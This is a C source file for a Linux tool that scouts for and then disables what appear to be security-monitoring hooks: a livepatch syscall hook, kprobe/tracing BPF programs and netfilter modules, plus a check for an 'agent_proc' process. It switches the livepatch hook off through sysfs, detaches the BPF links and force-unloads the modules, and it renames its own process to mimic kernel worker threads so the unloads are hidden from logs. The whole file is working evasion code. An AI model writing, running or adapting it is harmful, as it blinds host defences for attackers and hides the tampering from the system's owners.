#define _GNU_SOURCE
#ifndef MOD_LPHOOK
#define MOD_LPHOOK    "lp_hook"
#endif
#ifndef MOD_BPFHOOK
#define MOD_BPFHOOK   "bpf_hook"
#endif
#ifndef MOD_NFHOOK
#define MOD_NFHOOK    "nf_hook"
#endif
#ifndef MOD_NFHOOK_FE
#define MOD_NFHOOK_FE "nf_hook_fe"
#endif
#ifndef MOD_LPHOOK_PARAM_VER
#define MOD_LPHOOK_PARAM_VER "hook_version"
#endif
#ifndef MOD_LPHOOK_PARAM_DBG
#define MOD_LPHOOK_PARAM_DBG "hook_debug"
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <dirent.h>
#include <signal.h>
#include <linux/bpf.h>
#include <stddef.h>
static int bpf_call(int cmd, union bpf_attr *a, unsigned int sz)
{
    return (int)syscall(__NR_bpf, cmd, a, sz);
}

static int sysmod_read(const char *mod, const char *param, char *buf, size_t sz)
{
    char path[256];
    snprintf(path, sizeof(path), "/sys/module/%s/parameters/%s", mod, param);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, sz - 1); close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    if (n > 0 && buf[n - 1] == '\n') buf[n - 1] = '\0';
    return 0;
}

static int sysmod_write(const char *mod, const char *param, const char *val)
{
    char path[256];
    snprintf(path, sizeof(path), "/sys/module/%s/parameters/%s", mod, param);
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    ssize_t n = write(fd, val, strlen(val)); close(fd);
    return (n < 0) ? -1 : 0;
}

static int module_loaded(const char *name)
{
    FILE *f = fopen("/proc/modules", "r"); if (!f) return 0;
    char line[256]; int found = 0;
    while (fgets(line, sizeof(line), f)) {
        char mod[64];
        if (sscanf(line, "%63s", mod) == 1 && strcmp(mod, name) == 0) { found = 1; break; }
    }
    fclose(f);
    return found;
}

static pid_t find_proc(const char *pattern)
{
    DIR *dp = opendir("/proc"); if (!dp) return -1;
    struct dirent *de; pid_t found = -1;
    while ((de = readdir(dp)) && found < 0) {
        char *end; long pid = strtol(de->d_name, &end, 10);
        if (*end) continue;
        char path[64], comm[64];
        snprintf(path, sizeof(path), "/proc/%ld/comm", pid);
        int fd = open(path, O_RDONLY); if (fd < 0) continue;
        ssize_t n = read(fd, comm, sizeof(comm)-1); close(fd);
        if (n <= 0) continue;
        comm[n] = '\0'; if (comm[n-1] == '\n') comm[n-1] = '\0';
        if (strstr(comm, pattern)) found = (pid_t)pid;
    }
    closedir(dp);
    return found;
}

static int mod_refcnt(const char *name)
{
    FILE *f = fopen("/proc/modules", "r");
    if (!f) return -1;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        char mod[64]; int rc = 0;
        if (sscanf(line, "%63s %*s %d", mod, &rc) >= 2 && strcmp(mod, name) == 0) {
            fclose(f);
            return rc;
        }
    }
    fclose(f);
    return -1;
}

static void spoof_comm(const char *fake)
{
    prctl(PR_SET_NAME, fake, 0, 0, 0);
}

static int force_delete_module(const char *name)
{
    int r = (int)syscall(SYS_delete_module, name, O_NONBLOCK | O_TRUNC);
    if (r < 0 && errno == EBUSY) {
        r = (int)syscall(SYS_delete_module, name, O_NONBLOCK);
    }
    return r;
}

static int disable_lp_hook(void)
{
    if (!module_loaded(MOD_LPHOOK)) {
        printf("[lp_hook] not loaded\n");
        return 0;
    }
    char buf[64];
    int lp_enabled = -1, lp_unloadable = -1;
    if (sysmod_read(MOD_LPHOOK, "livepatch_enabled", buf, sizeof(buf)) == 0)
        lp_enabled = atoi(buf);
    if (sysmod_read(MOD_LPHOOK, "livepatch_unloadable", buf, sizeof(buf)) == 0)
        lp_unloadable = atoi(buf);
    printf("[lp_hook] livepatch_enabled=%d livepatch_unloadable=%d\n",
           lp_enabled, lp_unloadable);
    if (lp_enabled == 1) {
        if (sysmod_write(MOD_LPHOOK, "livepatch_enabled", "0") == 0) {
            printf("[lp_hook] livepatch_enabled → 0  (sys_call_dispatcher unpatched)\n");
        } else {
            printf("[lp_hook] could not write livepatch_enabled: %s\n", strerror(errno));
        }
    }
    sysmod_write(MOD_LPHOOK, "do_livepatch", "0");
    return 0;
}

static int unload_lp_mod(void)
{
    if (!module_loaded(MOD_LPHOOK)) {
        printf("[lp_hook] already absent\n");
        return 0;
    }
    if (sysmod_write(MOD_LPHOOK, "livepatch_unloadable", "1") == 0)
        printf("[lp_hook] livepatch_unloadable → 1\n");
    char orig[16];
    prctl(PR_GET_NAME, orig, 0, 0, 0);
    spoof_comm("kworker/0:0H");
    int rc = force_delete_module(MOD_LPHOOK);
    int err = errno;
    spoof_comm(orig);
    if (rc == 0)
        printf("[lp_hook] unloaded\n");
    else
        printf("[lp_hook] delete_module failed: %s\n", strerror(err));
    return rc;
}

static int flush_bpf_hook(void)
{
    if (!module_loaded(MOD_BPFHOOK)) {
        printf("[bpf_hook] not loaded\n");
        return 0;
    }
    int detached = 0, skipped = 0;
    uint32_t id = 0;
    for (;;) {
        union bpf_attr a = {};
        a.start_id = id;
        int r = bpf_call(BPF_PROG_GET_NEXT_ID, &a, sizeof(a));
        if (r < 0) break;
        id = a.next_id;
        union bpf_attr oattr = {};
        oattr.prog_id = id;
        int fd = bpf_call(BPF_PROG_GET_FD_BY_ID, &oattr, sizeof(oattr));
        if (fd < 0) continue;
        union bpf_attr info_attr = {};
        struct bpf_prog_info info = {};
        info_attr.info.bpf_fd   = (uint32_t)fd;
        info_attr.info.info_len = sizeof(info);
        info_attr.info.info     = (uint64_t)(uintptr_t)&info;
        bpf_call(BPF_OBJ_GET_INFO_BY_FD, &info_attr, sizeof(info_attr));
        int is_hook = (info.type == BPF_PROG_TYPE_KPROBE   ||
                       info.type == BPF_PROG_TYPE_TRACING);
        close(fd);
        if (!is_hook) { skipped++; continue; }
        uint32_t lid = 0;
        int prog_detached = 0;
        for (;;) {
            union bpf_attr la = {};
            la.start_id = lid;
            int lr = bpf_call(BPF_LINK_GET_NEXT_ID, &la, sizeof(la));
            if (lr < 0) break;
            lid = la.next_id;
            union bpf_attr loa = {};
            loa.link_id = lid;
            int lfd = bpf_call(BPF_LINK_GET_FD_BY_ID, &loa, sizeof(loa));
            if (lfd < 0) continue;
            union bpf_attr li_attr = {};
            struct bpf_link_info li = {};
            li_attr.info.bpf_fd   = (uint32_t)lfd;
            li_attr.info.info_len = sizeof(li);
            li_attr.info.info     = (uint64_t)(uintptr_t)&li;
            bpf_call(BPF_OBJ_GET_INFO_BY_FD, &li_attr, sizeof(li_attr));
            if (li.prog_id != id) { close(lfd); continue; }
            union bpf_attr da = {};
            da.link_detach.link_fd = (uint32_t)lfd;
            int dr = bpf_call(BPF_LINK_DETACH, &da, sizeof(da));
            close(lfd);
            if (dr == 0) { detached++; prog_detached = 1; }
        }
        if (!prog_detached) skipped++;
    }
    printf("[bpf_hook] BPF links detached=%d skipped=%d\n", detached, skipped);
    char orig[16];
    prctl(PR_GET_NAME, orig, 0, 0, 0);
    spoof_comm("kworker/0:1H");
    int rc = force_delete_module(MOD_BPFHOOK);
    int err = errno;
    spoof_comm(orig);
    if (rc == 0)
        printf("[bpf_hook] unloaded\n");
    else
        printf("[bpf_hook] delete_module: %s\n", strerror(err));
    return 0;
}

static int flush_nf_hook(void)
{
    int any = module_loaded(MOD_NFHOOK) || module_loaded(MOD_NFHOOK_FE);
    if (!any) {
        printf("[nf_hook] not loaded\n");
        return 0;
    }
    char orig[16];
    prctl(PR_GET_NAME, orig, 0, 0, 0);
    spoof_comm("kworker/u4:2");
    if (module_loaded(MOD_NFHOOK)) {
        int r = force_delete_module(MOD_NFHOOK);
        printf("[nf_hook] %s\n", r == 0 ? "unloaded" : strerror(errno));
    }
    usleep(50000);
    if (module_loaded(MOD_NFHOOK_FE)) {
        int r = force_delete_module(MOD_NFHOOK_FE);
        printf("[nf_hook_fe] %s\n", r == 0 ? "unloaded" : strerror(errno));
    }
    spoof_comm(orig);
    return 0;
}

static void print_sysmod_param(const char *mod, const char *param)
{
    char buf[128];
    if (sysmod_read(mod, param, buf, sizeof(buf)) == 0)
        printf("    %-32s = %s\n", param, buf);
    else
        printf("    %-32s = (not readable)\n", param);
}

static void recon(void)
{
    const char *hook_mods[] = { MOD_LPHOOK, MOD_BPFHOOK, MOD_NFHOOK, MOD_NFHOOK_FE, NULL };
    for (int i = 0; hook_mods[i]; i++) {
        int loaded = module_loaded(hook_mods[i]);
        printf("[%s] loaded=%s refcnt=%d\n",
               hook_mods[i], loaded ? "yes" : "no", loaded ? mod_refcnt(hook_mods[i]) : 0);
    }
    puts("");
    if (module_loaded(MOD_LPHOOK)) {
        printf("[lp_hook] parameters:\n");
        print_sysmod_param(MOD_LPHOOK, MOD_LPHOOK_PARAM_VER);
        print_sysmod_param(MOD_LPHOOK, MOD_LPHOOK_PARAM_DBG);
        print_sysmod_param(MOD_LPHOOK, "livepatch_enabled");
        print_sysmod_param(MOD_LPHOOK, "livepatch_unloadable");
        print_sysmod_param(MOD_LPHOOK, "do_livepatch");
        print_sysmod_param(MOD_LPHOOK, "livepatch_native_sys_call");
        print_sysmod_param(MOD_LPHOOK, "livepatch_compat_sys_call");
    }
    if (module_loaded(MOD_BPFHOOK)) {
        int kp = 0, tr = 0;
        uint32_t id = 0;
        for (;;) {
            union bpf_attr a = {};
            a.start_id = id;
            if (bpf_call(BPF_PROG_GET_NEXT_ID, &a, sizeof(a)) < 0) break;
            id = a.next_id;
            union bpf_attr oa = {};
            oa.prog_id = id;
            int fd = bpf_call(BPF_PROG_GET_FD_BY_ID, &oa, sizeof(oa));
            if (fd < 0) continue;
            union bpf_attr ia = {};
            struct bpf_prog_info inf = {};
            ia.info.bpf_fd   = (uint32_t)fd;
            ia.info.info_len = sizeof(inf);
            ia.info.info     = (uint64_t)(uintptr_t)&inf;
            bpf_call(BPF_OBJ_GET_INFO_BY_FD, &ia, sizeof(ia));
            close(fd);
            if (inf.type == BPF_PROG_TYPE_KPROBE)   kp++;
            else if (inf.type == BPF_PROG_TYPE_TRACING) tr++;
        }
        printf("[bpf_hook] BPF programs: kprobe=%d tracing=%d\n", kp, tr);
    }
    pid_t agent = find_proc("agent_proc");
    if (agent > 0) printf("[userspace] agent_proc pid=%d\n", agent);
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <recon|livepatch-off|flush-bpf|flush-netfilter|full>\n", argv[0]);
        return 1;
    }
    if (strcmp(argv[1], "recon") == 0) {
        recon();
    } else if (strcmp(argv[1], "livepatch-off") == 0) {
        disable_lp_hook();
    } else if (strcmp(argv[1], "flush-bpf") == 0) {
        flush_bpf_hook();
    } else if (strcmp(argv[1], "flush-netfilter") == 0) {
        flush_nf_hook();
    } else if (strcmp(argv[1], "full") == 0) {
        recon();
        puts("[*] disabling livepatch hook...");
        disable_lp_hook();
        puts("[*] flushing BPF hook programs...");
        flush_bpf_hook();
        puts("[*] unloading netfilter hook stack...");
        flush_nf_hook();
        puts("[*] unloading livepatch hook module...");
        unload_lp_mod();
        puts("[*] done.");
    } else {
        fprintf(stderr, "unknown command: %s\n", argv[1]);
        return 1;
    }
    return 0;
}
